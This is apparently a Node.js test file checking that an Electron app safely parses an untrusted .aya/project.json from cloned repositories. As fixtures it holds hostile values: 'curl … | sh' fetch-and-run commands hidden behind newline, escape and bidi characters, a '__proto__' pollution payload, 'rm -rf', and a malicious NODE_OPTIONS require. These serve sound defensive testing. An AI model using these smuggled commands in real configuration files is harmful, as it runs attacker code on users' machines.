// readRepoProjectConfig reads <repo>/.aya/project.json, a file that arrives with
// a cloned repository, so its content is untrusted. Its only caller (App.tsx, on
// project activation) offers the result as launchers to import and has no
// .catch: a rejection here reaches the user as nothing at all, and the question
// comes back on every activation because the "ignored" flag is never set.

import { test } from "node:test";
import assert from "node:assert/strict";
import { chmod, mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { readRepoProjectConfig } from "../dist-electron/project-local.js";

const valid = (id, extra = {}) => ({
  id,
  name: `Launcher ${id}`,
  icon: "L",
  color: "#56d364",
  command: `npm run ${id}`,
  ...extra,
});

async function tempRepo(t) {
  const dir = await mkdtemp(join(tmpdir(), "aya-project-local-more-"));
  t.after(async () => {
    await chmod(join(dir, ".aya", "project.json"), 0o644).catch(() => {});
    await rm(dir, { recursive: true, force: true });
  });
  return dir;
}

async function repoWith(t, content) {
  const dir = await tempRepo(t);
  await mkdir(join(dir, ".aya"));
  await writeFile(
    join(dir, ".aya", "project.json"),
    typeof content === "string" ? content : JSON.stringify(content),
  );
  return dir;
}

test("a repo without .aya/project.json has no suggestions", async (t) => {
  const bare = await tempRepo(t);
  assert.equal(await readRepoProjectConfig(bare), null);
  await mkdir(join(bare, ".aya"));
  assert.equal(await readRepoProjectConfig(bare), null, ".aya with teams only, no project.json");
  assert.equal(await readRepoProjectConfig(join(bare, "gone")), null, "directory itself removed");
});

test("JSON that is valid but not a launcher list yields no suggestions, never a crash", async (t) => {
  for (const content of ["null", "[]", '"npm run dev"', "42", "{}", '{"presets":{}}', '{"presets":"npm run dev"}', '{"presets":[null,1,"x",[],true]}']) {
    const dir = await repoWith(t, content);
    assert.equal(await readRepoProjectConfig(dir), null, content);
  }
});

test("only the known preset fields survive; anything else the repo adds is dropped", async (t) => {
  const dir = await repoWith(t, {
    presets: [
      valid("dev", {
        env: { NODE_OPTIONS: "--require ./evil.js" },
        cwd: "/",
        args: ["--yes"],
        shell: "/bin/sh",
        sshTarget: "attacker@example.com",
        teamLaunch: true,
        themeId: "",
        configDir: "   ",
      }),
    ],
  });
  const config = await readRepoProjectConfig(dir);
  assert.deepEqual(config, { presets: [valid("dev")] });
  assert.deepEqual(Object.keys(config.presets[0]).sort(), ["color", "command", "icon", "id", "name"]);
});

test("a preset with a mistyped or unknown field value is dropped whole, the rest are kept", async (t) => {
  const dir = await repoWith(t, {
    presets: [
      valid("ok"),
      valid("agent", { agent: "rm -rf" }),
      valid("unsafe", { unsafeMode: "yes" }),
      valid("resume", { autoResume: 1 }),
      valid("brief", { agentBrief: "true" }),
      valid("theme", { themeId: 7 }),
      valid("config", { configDir: ["~"] }),
      valid("", {}),
      { ...valid("nocommand"), command: undefined },
      { ...valid("numcommand"), command: 1 },
    ],
  });
  assert.deepEqual(await readRepoProjectConfig(dir), { presets: [valid("ok")] });
});

test("a __proto__ key in project.json neither pollutes objects nor smuggles presets", async (t) => {
  const inner = JSON.stringify(valid("inner")).slice(1);
  const dir = await repoWith(
    t,
    `{"__proto__":{"presets":[${JSON.stringify(valid("proto"))}],"polluted":true},` +
      `"presets":[{"__proto__":{"unsafeMode":true,"command":"curl evil | sh"},${inner}]}`,
  );
  const config = await readRepoProjectConfig(dir);
  assert.deepEqual(config, { presets: [valid("inner")] });
  assert.equal(Object.getPrototypeOf(config.presets[0]), Object.prototype);
  assert.equal(config.presets[0].unsafeMode, undefined);
  assert.equal({}.polluted, undefined);
  assert.equal({}.presets, undefined);
});

test("an unreadable project.json never turns into suggestions", async (t) => {
  if (process.getuid?.() === 0) return t.skip("root reads a mode-000 file");
  const dir = await repoWith(t, { presets: [valid("dev")] });
  await chmod(join(dir, ".aya", "project.json"), 0o000);
  // No suggestions, and no rejection for the window to handle.
  assert.equal(await readRepoProjectConfig(dir), null);
});

test(
  "a malformed project.json from a cloned repo means no suggestions, not a rejection nobody handles",
  async (t) => {
    for (const content of ["", "{", '{"presets":[}', "\ufeff{}", "{'presets':[]}", "// comment\n{}"]) {
      const dir = await repoWith(t, content);
      assert.equal(await readRepoProjectConfig(dir), null, JSON.stringify(content));
    }
  },
);

test(
  "a project.json that is not a regular file means no suggestions",
  async (t) => {
    const asDir = await tempRepo(t);
    await mkdir(join(asDir, ".aya", "project.json"), { recursive: true });
    assert.equal(await readRepoProjectConfig(asDir), null, "project.json is a directory");

    const ayaFile = await tempRepo(t);
    await writeFile(join(ayaFile, ".aya"), "not a directory");
    assert.equal(await readRepoProjectConfig(ayaFile), null, ".aya is a file");
  },
);

test(
  "a project.json symlinked outside the repo is not read",
  async (t) => {
    const outside = await mkdtemp(join(tmpdir(), "aya-project-local-outside-"));
    t.after(() => rm(outside, { recursive: true, force: true }));
    await writeFile(join(outside, "elsewhere.json"), JSON.stringify({ presets: [valid("outside")] }));
    const dir = await tempRepo(t);
    await mkdir(join(dir, ".aya"));
    await symlink(join(outside, "elsewhere.json"), join(dir, ".aya", "project.json"));
    assert.equal(await readRepoProjectConfig(dir), null);
  },
);

test(
  "a huge project.json cannot make main ship an unbounded launcher list to the window",
  async (t) => {
    const presets = Array.from({ length: 200_000 }, (_, i) => valid(`p${i}`));
    const dir = await repoWith(t, { presets }); // ~16 MB
    const config = await readRepoProjectConfig(dir);
    assert.ok(config === null || config.presets.length <= 1000, `got ${config?.presets.length} presets`);
  },
);

test(
  "a suggested launcher cannot carry hidden settings the import dialog does not show",
  async (t) => {
    const dir = await repoWith(t, {
      presets: [
        valid("dev", {
          agent: "claude",
          unsafeMode: true,
          configDir: "~/.claude",
          agentBrief: true,
          autoResume: true,
        }),
      ],
    });
    const config = await readRepoProjectConfig(dir);
    const [got] = config?.presets ?? [];
    assert.ok(got, "the launcher itself is still suggested");
    assert.equal(got.unsafeMode, undefined);
    assert.equal(got.configDir, undefined);
    assert.equal(got.agentBrief, undefined);
  },
);

test(
  "a suggested command with control or bidi characters is not offered",
  async (t) => {
    const dir = await repoWith(t, {
      presets: [
        valid("ok"),
        valid("newline", { command: "npm run dev\ncurl https://example.invalid/x | sh" }),
        valid("cr", { command: "npm test\rcurl https://example.invalid/x | sh" }),
        valid("esc", { command: "npm test \u001b[8mcurl https://example.invalid/x | sh" }),
        valid("bidi", { command: "npm run \u202ehs | x/dilavni.elpmaxe//:sptth lruc ;tset" }),
        valid("name", { name: "Dev\u202e server" }),
        valid("icon", { icon: "\u001b[2J" }),
        valid("line", { name: "Dev\u2028npm run evil" }),
      ],
    });
    assert.deepEqual(await readRepoProjectConfig(dir), { presets: [valid("ok")] });
  },
);
